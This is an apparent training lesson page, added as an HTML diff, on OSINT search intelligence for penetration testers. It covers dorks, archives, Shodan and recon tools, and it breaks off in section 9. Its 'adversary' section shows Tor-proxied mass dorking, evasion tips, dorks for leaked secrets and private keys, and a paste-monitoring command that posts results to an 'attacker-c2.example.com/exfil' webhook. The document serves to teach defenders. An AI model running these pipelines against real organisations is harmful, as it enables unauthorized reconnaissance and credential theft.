@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Additional Search Intelligence Tools &amp; Tips | ISCSECURITY Master Class Series</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="stylesheet" href="/css/styles.css?v=2026_PRODUCTION_FINAL" />
+  
+  <!-- MemberSpace -->
+  <script>
+    window.MemberSpace = window.MemberSpace || { subdomain: "iscsecurity" };
+    (function(d){
+      var s = d.createElement("script");
+      s.src = "https://cdn.memberspace.com/scripts/widgets.js";
+      s.async = true;
+      d.head.appendChild(s);
+    })(document);
+  </script>
+  
+</head>
+
+<body class="page-lesson">
+
+<div class="site-topbar" role="note" aria-label="Legal notice">
+  <small class="topbar-note">
+    © 2026 ISCSECURITY · Authorization-first training. All testing must be lawful, scoped, and approved in writing.
+  </small>
+	<nav class="topbar-links" aria-label="Topbar links">
+      <a href="https://iscsecurity.org/index">Home</a>
+      <a href="https://iscsecurity.org/content/index">Content</a>
+	  <a href="https://iscsecurity.org/content/1-ethical-hacking/2-open-source-intelligence/index">OSINT</a>
+      <a href="https://iscsecurity.org/contact">Contact</a>
+    </nav>
+</div>
+
+  <main class="page modules-page no-shift" id="ethical-hacking-training-content" data-ms-content="members-only">
+  <article class="lesson-content overlay" tabindex="0" aria-label="Lesson content: Additional Search Intelligence Tools &amp; Tips">
+
+    <p class="breadcrumb">
+      <a href="https://iscsecurity.org/index">Home</a> →
+        <a href="https://iscsecurity.org/content/index">Content</a> →
+        <a href="https://iscsecurity.org/content/1-ethical-hacking/2-open-source-intelligence/index">OSINT</a> →
+      <span aria-current="page">Page 10</span>
+    </p>
+
+    <h1>Additional Search Intelligence Tools &amp; Tips</h1>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: AUTHORIZED USE BANNERS                               -->
+    <!-- ============================================================ -->
+
+    <div class="reminder-auth">
+      <strong>🚨 AUTHORIZED USE ONLY:</strong>
+      <span>
+        All content in this document is for educational and defensive training purposes only. 
+        The adversarial techniques described are derived from real-world tradecraft but 
+        are documented exclusively for <strong>defensive analysis, detection engineering, 
+        and authorized security testing</strong>. Unauthorized deployment of any technique 
+        described may constitute a criminal offense under applicable national and 
+        international cybercrime laws. Always obtain <strong>explicit written authorization</strong> 
+        from the system owner or authorized legal entity before testing, executing, or 
+        simulating any of the techniques outlined in this document.
+      </span>
+    </div>
+
+    <div class="reminder-comp">
+      <strong>🌍 INTERNATIONAL COMPLIANCE NOTICE:</strong>
+      <span>
+        Cybercrime laws vary significantly by jurisdiction. It is your sole responsibility 
+        to understand and comply with the laws applicable to your location, the location 
+        of any target systems, and your organization's policies. When in doubt, 
+        <strong>consult a qualified legal professional</strong> before testing, executing, 
+        or simulating any technique described in this document.
+      </span>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: SEARCH INTELLIGENCE IN A PENTEST CONTEXT            -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="search-intel-overview">
+      <h2 id="search-intel-overview">1. Search Intelligence in a Pentest Context</h2>
+
+      <p>
+        Search intelligence in this context means using search engines, archives,
+        and indexing platforms to collect <strong>Open-Source Intelligence (OSINT)</strong>, 
+        information that is publicly available but not always obvious. For a penetration
+        test or Red Team engagement, the goal is to:
+      </p>
+
+      <ul>
+        <li>Discover exposed assets, forgotten applications, and stale endpoints.</li>
+        <li>Identify historical leaks, configuration remnants, and deleted content.</li>
+        <li>Understand how the target appears from different countries or regions.</li>
+      </ul>
+
+      <div class="reminder-opsec">
+        <strong>OPSEC Principle:</strong><br>
+        <span>Treat search intelligence as pre-engagement reconnaissance. Never access
+        resources that would exceed your written authorization, even if they are
+        indexed or archived somewhere online.</span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: REGION-AWARE RECON                                  -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="isearchfrom">
+      <h2 id="isearchfrom">2. Region-Aware Recon with isearchfrom.com</h2>
+
+      <p>
+        <a href="https://www.isearchfrom.com" target="_blank" rel="noopener">isearchfrom.com</a>
+        allows you to simulate Google searches from different countries and languages
+        without needing local proxies or full VPN setups.
+      </p>
+
+      <p><strong>Practical uses during an engagement include:</strong></p>
+
+      <ul>
+        <li>Comparing <strong>region-specific search results</strong> for the same dork.</li>
+        <li>Spotting <strong>geo-targeted content or censorship</strong> affecting results.</li>
+        <li>Checking how a client's brand, domains, and subdomains surface in different markets.</li>
+      </ul>
+
+      <p>
+        For example, you might run a baseline Google Dork from your normal browser:
+      </p>
+
+      <pre><code class="language-bash">site:example.org "confidential" filetype:pdf</code></pre>
+
+      <p>
+        Then re-run the same query via isearchfrom.com as if you were in another
+        country. Different PDF hits may appear, sometimes including older reports
+        or localized content that is still in scope.
+      </p>
+
+      <div class="reminder-lightblue">
+        <strong>Note:</strong><br>
+        <span>Use isearchfrom.com to confirm that sensitive documents are not exposed in
+        specific regions, especially if your client operates in multiple jurisdictions.</span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: HISTORIC EXPOSURES WITH WAYBACK MACHINE             -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="wayback">
+      <h2 id="wayback">3. Historic Exposures with the WayBack Machine</h2>
+
+      <p>
+        The <a href="https://archive.org/web/" target="_blank" rel="noopener">WayBack Machine</a>
+        stores historical snapshots of websites and often captures URLs, documents,
+        and resources that are no longer visible on the live site.
+      </p>
+
+      <p><strong>Typical Red Team and forensic uses:</strong></p>
+
+      <ul>
+        <li>Finding <strong>deleted pages or files</strong> that reference old systems.</li>
+        <li>Investigating <strong>historic exposures or breached content</strong>.</li>
+        <li>Auditing how a web presence evolved over time (e.g., login paths, API routes).</li>
+      </ul>
+
+      <p>
+        You can combine Google Dorking with archive search to locate old leaks:
+      </p>
+
+      <pre><code class="language-bash">site:archive.org "confidential" filetype:pdf</code></pre>
+
+      <p>
+        Once you locate a snapshot, pivot into it and search for keywords such as
+        <code>password</code>, <code>key</code>, or internal hostnames. Always verify that
+        using this information is explicitly permitted in your rules of engagement.
+      </p>
+
+      <div class="reminder">
+        <strong>Operator Note:</strong><br>
+        <span>Archived content can still contain live credentials or internal details.
+        Treat it with the same care as any other sensitive data.</span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: TYPICAL WORKFLOW                                    -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="workflow">
+      <h2 id="workflow">4. Typical Workflow: Dorks, Regions, and Archives</h2>
+
+      <p><strong>A simple, repeatable workflow for search intelligence might look like this:</strong></p>
+
+      <ul>
+        <li>
+          Run an initial set of <strong>Google Dorks</strong> from your normal environment.
+          Note interesting URLs, file types, and parameters.
+        </li>
+        <li>
+          Re-run the same dorks using <strong>isearchfrom.com</strong> to simulate
+          different countries and languages, looking for regional differences.
+        </li>
+        <li>
+          Take the most promising URLs and check them in the
+          <strong>WayBack Machine</strong> to identify older versions, deleted files,
+          or previously exposed paths.
+        </li>
+        <li>
+          For a penetration test or research project, repeat this cycle for high-value
+          domains, subdomains, and key services to build broader coverage.
+        </li>
+      </ul>
+
+      <div class="reminder-lightblue">
+        <strong>Note:</strong><br>
+        <span>Document your dorks and workflows in your engagement notes so findings are
+        reproducible during reporting and future re-tests.</span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: ADVERSARIAL TRADECRAFT                               -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="adversarial-tradecraft">
+      <h2 id="adversarial-tradecraft">5. Adversarial Tradecraft: How Threat Actors Weaponize Search Intelligence</h2>
+
+      <p>
+        Understanding how real-world adversaries abuse search intelligence is 
+        <strong>essential for defensive operations and authorized Red Team engagements</strong>. 
+        Threat actors, from ransomware affiliates to state-sponsored groups, routinely 
+        use the same engines and archives described in this chapter to select targets, 
+        identify exposed infrastructure, and discover credentials without ever touching 
+        the target's perimeter.
+      </p>
+
+      <h3>a) Adversarial Mindset &amp; Target Selection</h3>
+
+      <p>
+        Unlike authorized testers, adversaries operate without scope constraints. Their 
+        workflow prioritizes <strong>speed, anonymity, and scalability</strong>:
+      </p>
+
+      <ul>
+        <li>
+          <strong>Mass reconnaissance:</strong> Automated dorking across thousands of domains 
+          to find low-hanging fruit (exposed panels, default credentials, open directories).
+        </li>
+        <li>
+          <strong>Credential harvesting:</strong> Monitoring paste sites, GitHub, and archives 
+          for accidental leaks containing corporate emails, API keys, or VPN configurations.
+        </li>
+        <li>
+          <strong>Infrastructure mapping:</strong> Querying Shodan and Censys for specific 
+          service banners, SSL certificates, or industrial control system (ICS) signatures 
+          tied to high-value sectors.
+        </li>
+      </ul>
+
+      <div class="info-remember">
+        <strong>Defensive Translation:</strong><br>
+        <span>By studying adversarial reconnaissance patterns, defenders can deploy 
+        <strong>honeypots</strong>, monitor for suspicious query patterns, and proactively 
+        remove sensitive indexed content before it is exploited.</span>
+      </div>
+
+      <h3>b) Real-World Adversarial Examples</h3>
+
+      <p>
+        The following examples are derived from public incident reports and threat 
+        intelligence disclosures. They illustrate how search intelligence translates 
+        directly into unauthorized access:
+      </p>
+
+      <ul>
+        <li>
+          <strong>Exposed Build Artifacts:</strong> An adversary used 
+          <code>site:target.com filetype:env</code> and 
+          <code>site:target.com inurl:.git</code> to locate unprotected environment files 
+          and Git repositories containing database passwords.
+        </li>
+        <li>
+          <strong>ICS Targeting via Shodan:</strong> A threat actor queried Shodan for 
+          <code>SCADA Country:"[Target Country]"</code> to identify energy-sector control 
+          systems with default administrator portals exposed to the internet.
+        </li>
+        <li>
+          <strong>Historical Credential Recovery:</strong> Using the WayBack Machine, an 
+          attacker recovered an old employee directory (PDF) that contained internal 
+          usernames and retired naming conventions, later used for password-spray campaigns.
+        </li>
+        <li>
+          <strong>Regional Dork Variation:</strong> Operators simulated searches from 
+          multiple countries to find localized staging servers and marketing subdomains 
+          with weaker security postures than the primary corporate site.
+        </li>
+      </ul>
+
+      <h3>c) Adversary Tools &amp; Commands</h3>
+
+      <p>
+        Adversaries often use the same tooling as security researchers but chain them 
+        into automated pipelines for mass exploitation. Representative commands include:
+      </p>
+
+      <p><strong>Mass Google Dorking (automated with proxies):</strong></p>
+      <pre><code class="language-bash"># Search for exposed configuration files across a target list
+for domain in $(cat targets.txt); do
+  dork="site:${domain} ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini"
+  # Queries routed through anonymization layer (Tor/proxy)
+  python3 dorkbot.py -d "$dork" --proxy socks5://127.0.0.1:9050
+done</code></pre>
+
+      <p><strong>Credential and leak discovery via Intelligence X / Dark Web:</strong></p>
+      <pre><code class="language-bash"># Query Intelligence X for domain-related leaks (representative API pattern)
+curl -s "https://2.intelx.io/phonebook/search?k=[API_KEY]&amp;q=target.com" \
+  -H "User-Agent: Mozilla/5.0" | jq '.selectors[] | .selectorvalue'</code></pre>
+
+      <p><strong>Shodan host discovery for exposed services:</strong></p>
+      <pre><code class="language-bash"># Identify exposed RDP, SMB, or database services linked to target ASN/IP space
+shodan search --fields ip_str,port,org,hostnames "asn:AS#### product:Microsoft Windows Remote Desktop"
+shodan search --fields ip_str,port "ssl.cert.subject.cn:target.com 200"</code></pre>
+
+      <p><strong>Archive-based URL harvesting for hidden endpoints:</strong></p>
+      <pre><code class="language-bash"># Pull historical URLs and filter for parameters, login panels, or backups
+echo "target.com" | gau --providers wayback,otx,commoncrawl | tee urls.txt
+cat urls.txt | grep -E '(?|login|admin|backup|config|.env|.sql)' > pivot-targets.txt</code></pre>
+
+      <p><strong>Social media and paste-site monitoring:</strong></p>
+      <pre><code class="language-bash"># Automated monitoring for keywords on paste sites (conceptual pipeline)
+python3 paste-monitor.py --keywords "target.com,TARGET_VPN,TARGET_API" \
+  --channels pastebin,ghostbin,paste.ee --interval 300 \
+  --webhook https://attacker-c2.example.com/exfil</code></pre>
+
+      <div class="reminder-lightblue">
+        <strong>Note:</strong><br>
+        <span>The commands above are provided for <strong>defensive analysis and detection 
+        engineering</strong>. Understanding adversary query syntax helps defenders build 
+        better DLP rules, query monitoring, and takedown workflows.</span>
+      </div>
+
+      <h3>d) Adversary OPSEC &amp; Evasion Techniques</h3>
+
+      <p>
+        Sophisticated threat actors layer operational security (OPSEC) over their search 
+        intelligence activities to avoid attribution and rate-limiting:
+      </p>
+
+      <ul>
+        <li>
+          <strong>Proxy rotation:</strong> Routing all search engine and archive queries 
+          through residential proxies or Tor to prevent IP-based alerting.
+        </li>
+        <li>
+          <strong>Query fragmentation:</strong> Splitting large dork campaigns across 
+          multiple sessions and geographic regions to avoid CAPTCHA triggers and search 
+          engine throttling.
+        </li>
+        <li>
+          <strong>Temporal dispersion:</strong> Executing reconnaissance during off-peak 
+          hours or over weeks rather than days to blend into background noise.
+        </li>
+        <li>
+          <strong>Validation before exploitation:</strong> Using secondary OSINT to confirm 
+          a target is not a honeypot (e.g., checking domain age, certificate transparency 
+          logs, and organizational ownership).
+        </li>
+        <li>
+          <strong>Throwaway infrastructure:</strong> Leveraging disposable VPS instances 
+          and temporary search engine accounts for sustained monitoring.
+        </li>
+      </ul>
+
+      <div class="info-remember">
+        <strong>Blue Team Note:</strong><br>
+        <span>Search engines and archive services rarely generate security alerts on their 
+        own. Monitor your perimeter for the <strong>outcome</strong> of adversarial search 
+        intelligence; unexpected login attempts, exploitation of newly exposed endpoints, 
+        and DNS resolutions to suspicious scanners.</span>
+      </div>
+
+      <h3>e) Defensive Countermeasures &amp; Detection</h3>
+
+      <p>
+        Translating adversarial tradecraft into defensive action involves both 
+        <strong>proactive removal</strong> and <strong>detection engineering</strong>:
+      </p>
+
+      <ul>
+        <li>
+          <strong>Attack surface reduction:</strong> Regularly audit indexed content using 
+          the same dorks an adversary would use; request removal of sensitive snapshots 
+          from the WayBack Machine and search engines.
+        </li>
+        <li>
+          <strong>Honeypot deployment:</strong> Place deliberately indexed artifacts 
+          (fake credentials, decoy endpoints) and monitor for unauthorized access attempts.
+        </li>
+        <li>
+          <strong>Certificate and subdomain monitoring:</strong> Use Censys and Shodan 
+          alerts to detect when new client assets appear on the public internet.
+        </li>
+        <li>
+          <strong>Paste-site alerting:</strong> Subscribe to services like Intelligence X 
+          or deploy scrapers to detect organizational keywords on paste sites in near 
+          real-time.
+        </li>
+      </ul>
+
+      <div class="info-remember">
+        <strong>Adversarial Insight:</strong><br>
+        <span style="display: block; margin-top: 5px;">
+          The boundary between authorized OSINT and adversarial reconnaissance is defined 
+          only by <strong>intent and authorization</strong>. The tools, syntax, and workflows 
+          are nearly identical. Defenders who understand adversarial search tradecraft can 
+          predict attacker behavior, prioritize exposure remediation, and build detection 
+          logic that catches reconnaissance before it escalates to exploitation.
+        </span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: ADVANCED ARCHIVES AND OSINT PLATFORMS               -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="advanced-osint">
+      <h2 id="advanced-osint">6. Advanced Archives and OSINT Platforms</h2>
+
+      <p>
+        Beyond the baseline tools, several platforms can deepen your
+        <strong>Open-Source Intelligence (OSINT)</strong> coverage:
+      </p>
+
+      <div class="iscsec-table-responsive">
+        <table class="iscsec-table" aria-label="Advanced OSINT platforms">
+          <thead>
+            <tr>
+              <th>Tool/Service</th>
+              <th>Primary Role</th>
+              <th>Typical Red Team Use</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Archive.today/archive.is</strong></td>
+              <td>Snapshot and retrieve full pages, including images and subdomains.</td>
+              <td>Capture and preserve evidence of leaks or exposed panels before takedown.</td>
+            </tr>
+            <tr>
+              <td><strong>Library of Congress Web Archive</strong></td>
+              <td>Subject-focused web archives for long-term historical research.</td>
+              <td>Tracing old public content for regulated industries or legacy systems.</td>
+            </tr>
+            <tr>
+              <td><strong>Timetravel.mementoweb.org</strong></td>
+              <td>Look up how a webpage appeared at a specific point in time.</td>
+              <td>Compare content before and after incidents or public disclosures.</td>
+            </tr>
+            <tr>
+              <td><strong>Intelligence X</strong></td>
+              <td>Search leaked data, dark web content, and internet archives.</td>
+              <td>Investigate potential credential leaks or domain-related exposures.</td>
+            </tr>
+            <tr>
+              <td><strong>OSINT Framework</strong></td>
+              <td>Hub of categorized OSINT tools across multiple data types.</td>
+              <td>Starting point for structured investigations into people, domains, and files.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="reminder">
+        <strong>Operator Note:</strong><br>
+        <span>When using third-party OSINT platforms, verify the legal status of any
+        leaked data you access and follow your client's data-handling policy.</span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: EXPOSED INFRASTRUCTURE                              -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="shodan-vt-censys">
+      <h2 id="shodan-vt-censys">7. Exposed Infrastructure: Shodan, VirusTotal &amp; Censys</h2>
+
+      <h3>a) Shodan</h3>
+
+      <p>
+        Often described as <strong>"Google for devices"</strong>, Shodan indexes servers,
+        webcams, routers, industrial control systems, and more.
+      </p>
+
+      <ul>
+        <li>Enumerate exposed services associated with the client's IP ranges.</li>
+        <li>Identify forgotten hosts or outdated appliances on the public internet.</li>
+        <li>Correlate banners and certificates with the client's domains.</li>
+      </ul>
+
+      <h3>b) VirusTotal &amp; Censys</h3>
+
+      <p>
+        <strong>VirusTotal</strong> allows you to inspect suspicious files and URLs,
+        while <strong>Censys</strong> focuses on scanning and indexing exposed servers
+        and certificates globally.
+      </p>
+
+      <ul>
+        <li>Search for the client's domains or IP ranges in historic scan data.</li>
+        <li>Spot misconfigured services revealed by certificates or banners.</li>
+        <li>Cross-check potential malware samples for references to client assets.</li>
+      </ul>
+
+      <div class="reminder-lightblue">
+        <strong>Note:</strong><br>
+        <span>Treat findings from Shodan, VirusTotal, and Censys as leads, not proof.
+        Always validate them via in-scope tests before drawing conclusions.</span>
+      </div>
+    </section>
+
+    <!-- ============================================================ -->
+<!-- SECTION: AUTOMATION & SCRIPTING                               -->
+<!-- ============================================================ -->
+
+<section aria-labelledby="automation-scripting">
+  <h2 id="automation-scripting">8. Automation, CLI Tools &amp; OSINT Frameworks</h2>
+
+  <h3>SpiderFoot: Full-Spectrum Correlation</h3>
+
+  <p>
+    <strong>Adversary Intent:</strong> Correlate every discoverable asset (subdomains, emails, breaches, open ports, 
+	certificates) into a single graph to identify soft entry points and third-party trust relationships.
+  </p>
+
+<pre><code class="language-bash"># Attacker runs a wide-correlation scan against the target root domain
+spiderfoot -s target.com \
+  -m "sfp_dnsresolve,sfp_crt,sfp_shodan,sfp_binaryedge,sfp_emailformat,sfp_hunter,sfp_breach,sfp_archiveorg,sfp_censys" \
+  -o json > target_sf.json
+</code></pre>
+
+  <p>
+  <strong>Expected Output:</strong>
+  </p>
+
+<pre><code class="language-json">{
+  "type": "Internet Name",
+  "data": "dev-legacy.target.com",
+  "module": "sfp_crt",
+  "source": "crt.sh"
+}
+{
+  "type": "Email Address",
+  "data": "admin@target.com",
+  "module": "sfp_hunter",
+  "breach_source": "sfp_breach"
+}
+{
+  "type": "IP Address",
+  "data": "198.51.100.47",
+  "module": "sfp_shodan",
+  "open_ports": [22, 3389, 9200],
+  "banner": "Elasticsearch: 1.4.2"
+}
+</code></pre>
+
+  <h3>Recon-ng: Modular Workspace Harvesting</h3>
+
+  <p>
+    <strong>Adversary Intent:</strong> Build a SQLite-backed reconnaissance workspace that persists across sessions, then 
+	systematically brute-force hosts, resolve IPs, and check for credential leaks.
+  </p>
+
+<pre><code class="language-bash"># Attacker initializes a dedicated workspace
+recon-ng -w target_workspace
+
+[recon-ng][target_workspace] > marketplace install all
+[recon-ng][target_workspace] > modules load recon/domains-hosts/brute_hosts
+[recon-ng][target_workspace][brute_hosts] > options set SOURCE target.com
+[recon-ng][target_workspace][brute_hosts] > run
+[*] dev.target.com
+[*] mail.target.com
+[*] vpn.target.com
+
+[recon-ng][target_workspace] > modules load recon/hosts-ports/shodan_ip
+[recon-ng][target_workspace][shodan_ip] > options set SOURCE 198.51.100.0/24
+[recon-ng][target_workspace][shodan_ip] > run
+[*] 198.51.100.12 | 80, 443, 8080
+
+[recon-ng][target_workspace] > modules load recon/contacts-credentials/hibp_paste
+[recon-ng][target_workspace][hibp_paste] > options set SOURCE admin@target.com
+[recon-ng][target_workspace][hibp_paste] > run
+[*] Pastebin ID: aB3fG9x1 | Date: 2023-11-04 | Contains: password hash
+</code></pre>
+
+  <p>
+  <strong>Expected Output (database query):</strong>
+  </p>
+
+<pre><code class="language-bash">[recon-ng][target_workspace] > show contacts
++------------------+--------------+----------------+
+| email            | first_name   | last_name      |
++------------------+--------------+----------------+
+| admin@target.com | System       | Administrator  |
++------------------+--------------+----------------+
+
+[recon-ng][target_workspace] > show credentials
++--------------+---------------+
+| email        | password      |
++--------------+---------------+
+| dev@target.com | Winter2023! |
++--------------+---------------+
+</code></pre>
+
+  <h3>TheHarvester: Rapid Perimeter Enumeration</h3>
+
+  <p>
+    <strong>Adversary Intent:</strong> Quickly enumerate emails and hosts for initial phishing target lists and external 
+	footprinting before deeper scanning.
+  </p>
+
+<pre><code class="language-bash">theHarvester -d target.com -b all -f target_results.html
+</code></pre>
+
+  <p>
+  <strong>Expected Output:</strong>
+  </p>
+
+<pre><code class="language-text">*******************************************************************
+*  _   _                                            _             *
+* | |_| |__   ___    /\  /\__ _ _ ____   _____  ___| |_ ___ _ __  *
+* | __|  _ \ / _ \  / /_/ / _` | '__\ \ / / _ \/ __| __/ _ \ '__| *
+* | |_| | | |  __/ / __  / (_| | |   \ V /  __/\__ \ ||  __/ |    *
+*  \__|_| |_|\___| \/ /_/ \__,_|_|    \_/ \___||___/\__\___|_|    *
+*                                                                 *
+* theHarvester 4.4.0                                              *
+*******************************************************************
+
+[-] Searching in Anubis:
+    [*] No users found.
+[-] Searching in Baidu:
+    [*] dev.target.com
+    [*] staging.target.com
+[-] Searching in Hunter:
+    [*] john.doe@target.com
+    [*] jane.smith@target.com
+    [*] it-support@target.com
+[-] Searching in Shodan:
+    [*] 198.51.100.12 (Apache/2.4.41)
+    [*] 203.0.113.45 (Microsoft-IIS/10.0)
+[-] Saving results to target_results.html
+</code></pre>
+
+  <h3>CLI Automation for Archives</h3>
+
+  <h4>GAU (GetAllUrls): Historical Parameter Discovery</h4>
+
+  <p>
+    <strong>Adversary Intent:</strong> Harvest historical URLs to discover legacy parameters, API endpoints, and backup 
+	files for injection testing.
+  </p>
+
+<pre><code class="language-bash"># Attacker pipes a root domain into GAU and filters for juicy parameters
+echo "target.com" | gau --providers wayback,otx,commoncrawl --threads 10 \
+  | grep -E "\?|\&" \
+  | sort -u \
+  | tee target_params.txt
+</code></pre>
+
+  <p>
+  <strong>Expected Output:</strong>
+  </p>
+
+<pre><code class="language-text">https://target.com/api/v1/user?id=1&format=json
+https://target.com/search?q=test&category=all
+https://target.com/legacy/export.php?type=csv&token=xyz
+https://target.com/admin/backup.sql?download=1
+https://target.com/api/v2/invoice?ref=INV-2022&id=9942
+</code></pre>
+
+  <h4>Waymore: Deep Archive Response Mining</h4>
+
+  <p>
+    <strong>Adversary Intent:</strong> Scrape archived responses (not just URLs) to find API keys, hardcoded credentials, 
+	and deprecated endpoints that still resolve internally.
+  </p>
+
+<pre><code class="language-bash">python waymore.py -i target.com \
+  -mode R \
+  -oR target_responses/ \
+  -p 5 \
+  -c 50
+</code></pre>
+
+  <p>
+  <strong>Expected Output:</strong>
+  </p>
+
+<pre><code class="language-text">===============================================================================
+Waymore v1.2
+===============================================================================
+Getting URLs for target.com...
+✓ 14,203 unique URLs found from Wayback Machine
+✓ 892 unique URLs found from Common Crawl
+Processing archived responses...
+[200] https://target.com/old/assets/config.js  → saved to target_responses/19851...json
+[200] https://target.com/api/internal/swagger  → saved to target_responses/20301...json
+[!] Potential secret found in: target_responses/19851...json
+    String: "api_key":"sk_live_51HxZ9l2q..."
+</code></pre>
+
+  <h4>WaybackUrls: Quick Endpoint Extraction</h4>
+
+  <p>
+    <strong>Adversary Intent:</strong> Perform a fast sweep for interesting file extensions and paths that may have been removed from the current site but remain archived.
+  </p>
+
+<pre><code class="language-bash">echo "target.com" | waybackurls \
+  | grep -E "\.(pdf|docx|sql|zip|env|config|json|bak)$" \
+  | sort -u \
+  | tee target_files.txt
+  </code></pre>
+
+  <p>
+  <strong>Expected Output:</strong>
+  </p>
+
+<pre><code class="language-text">https://target.com/backup/config.json.bak
+https://target.com/assets/env.backup
+https://target.com/old/schema.sql
+https://target.com/reports/internal_audit_2021.pdf
+https://target.com/api/swagger.json
+</code></pre>
+
+  <h4>Katana: Headless Crawling + Passive Archive Ingestion</h4>
+
+  <p>
+    <strong>Adversary Intent:</strong> Crawl the live application while simultaneously ingesting passive archive URLs to 
+	maximize endpoint coverage, especially for JavaScript-heavy SPAs.
+  </p>
+
+<pre><code class="language-bash">katana -u https://target.com \
+  -jc \
+  -kf \
+  -passive \
+  -o katana_results.txt
+  </code></pre>
+
+  <p>
+  <strong>Expected Output:</strong>
+  </p>
+
+<pre><code class="language-text">[JS] https://target.com/static/app.js
+[FORM] https://target.com/login (POST: username, password, redirect)
+[ENDPOINT] https://target.com/api/v1/graphql
+[ENDPOINT] https://target.com/.git/HEAD
+[ARCHIVE] https://target.com/legacy-portal/admin.php
+[SECRET] https://target.com/static/app.js → aws_access_key_id=AKIA...
+</code></pre>
+
+  <h3>Google Dorks for Archives</h3>
+
+  <p>
+    <strong>Adversary Intent:</strong> Bypass current perimeter defenses by retrieving documents, configurations, and 
+	secrets that were indexed by archive engines or cached before deletion.
+  </p>
+
+  <p>
+  <strong>Query 1: Archived Configuration &amp; Secret Files</strong>
+  </p>
+
+<pre><code class="language-bash">site:web.archive.org target.com inurl:(env|config|settings|credentials)
+site:web.archive.org target.com filetype:json inurl:api
+</code></pre>
+
+  <p>
+  <strong>Expected Output (result snippets):</strong>
+  </p>
+
+<pre><code class="language-text">Backup Config JSON - web.archive.org/web/2022*/https://target.com/api/config.json
+--------------------------------------------------------------------------------
+{
+  "database": {
+    "host": "db.internal.target.com",
+    "user": "sa",
+    "pass": "Pr0d_DB_2022!"
+  },
+  "stripe_key": "sk_live_xxxxxxxx"
+}
+</code></pre>
+
+  <p>
+  <strong>Query 2: Historical Leaked Documents</strong>
+  </p>
+
+<pre><code class="language-bash">site:web.archive.org "target.com" "confidential" filetype:pdf
+site:web.archive.org "target.com" "internal use only" filetype:(docx | pptx)
+</code></pre>
+
+  <p>
+  <strong>Expected Output (result snippets):</strong>
+  </p>
+
+<pre><code class="language-text">Q3_Internal_Security_Audit.pdf - web.archive.org/web/20210115061234*/https://target.com/docs/Q3_Internal_Security_Audit.pdf
+--------------------------------------------------------------------------------
+Confidential – Internal Use Only
+Finding 4.2: VPN concentrator allows split tunneling without MFA...
+</code></pre>
+
+  <p>
+  <strong>Query 3: Paste &amp; Code Repository Leaks</strong>
+  </p>
+
+<pre><code class="language-bash">site:pastebin.com OR site:paste.ubuntu.com "target.com" (password OR api OR token)
+site:github.com "target.com" "BEGIN RSA PRIVATE KEY"
+site:trello.com "target.com" "confidential"
+</code></pre>
+
+  <p>
+  <strong>Expected Output (result snippets):</strong>
+  </p>
+
+<pre><code class="language-text">Pastebin - untitled - https://pastebin.com/raw/AbC123XyZ
+--------------------------------------------------------------------------------
+# Target.com dev credentials
+DB_HOST=prod-db.target.com
+DB_PASS=Sup3rS3cret!2023
+API_KEY=ak_live_51Hxxxx...
+</code></pre>
+
+  <h3>Summary Table for Quick Reference</h3>
+
+  <div class="iscsec-table-responsive">
+    <table class="iscsec-table" aria-label="OSINT automation tools quick reference">
+      <thead>
+        <tr>
+          <th>Tool / Technique</th>
+          <th>Adversary Goal</th>
+          <th>Key Output Artifact</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>SpiderFoot</strong></td>
+          <td>Correlate all entities</td>
+          <td>JSON graph of hosts, emails, IPs, breaches</td>
+        </tr>
+        <tr>
+          <td><strong>Recon-ng</strong></td>
+          <td>Persistent modular recon</td>
+          <td>SQLite DB of hosts, contacts, creds</td>
+        </tr>
+        <tr>
+          <td><strong>TheHarvester</strong></td>
+          <td>Rapid email/host enumeration</td>
+          <td>.html/stdout list of emails and subdomains</td>
+        </tr>
+        <tr>
+          <td><strong>GAU</strong></td>
+          <td>Parameter &amp; legacy endpoint discovery</td>
+          <td>urls.txt with query strings and paths</td>
+        </tr>
+        <tr>
+          <td><strong>Waymore</strong></td>
+          <td>Mine archived response bodies</td>
+          <td>Directory of saved responses with secrets</td>
+        </tr>
+        <tr>
+          <td><strong>WaybackUrls</strong></td>
+          <td>Filtered file/path extraction</td>
+          <td>List of backup/config files</td>
+        </tr>
+        <tr>
+          <td><strong>Katana</strong></td>
+          <td>Live + passive JS/endpoint crawling</td>
+          <td>Endpoints, forms, and embedded secrets</td>
+        </tr>
+        <tr>
+          <td><strong>Google Dorks</strong></td>
+          <td>Find indexed historical leaks</td>
+          <td>Cached PDFs, configs, and paste dumps</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="reminder">
+    <strong>Operator Note:</strong><br>
+    <span>Wrap automation around your OSINT process, while keeping human expertise a priority.
+    Context and judgement are what turn results into real intelligence. These examples are intended 
+    for authorized red team engagements, penetration testing, and defensive OSINT exercises. 
+    Always operate within the scope of a signed rules of engagement.</span>
+  </div>
+</section>
+
+    <!-- ============================================================ -->
+    <!-- SECTION: SOCIAL MEDIA, PASTES & GEOLOCATION                  -->
+    <!-- ============================================================ -->
+
+    <section aria-labelledby="social-media-geo">
+      <h2 id="social-media-geo">9. Social Media, Pastes &amp; Geolocation</h2>
+
+      <h3>Social Media Monitoring &amp; Paste Archives</h3>
+
+      <p>
